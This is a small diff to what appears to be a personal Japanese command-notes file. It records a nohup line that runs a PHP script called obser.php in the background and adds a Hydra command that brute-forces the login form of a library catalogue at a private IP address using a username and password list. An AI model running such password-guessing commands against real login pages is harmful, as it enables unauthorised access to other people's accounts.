@@ -1,4 +1,6 @@
-obser.php
+<obser.php>
 スクリプトをバックグラウンドで実行:
 nohup php /var/www/html/log/obser.php > output.log 2>&1 &
 
+<hydra>
+time hydra -V -L a.txt -P a.txt 192.168.3.22 http-post-form "/library/opac/:username=^USER^&password=^PASS^:login false"
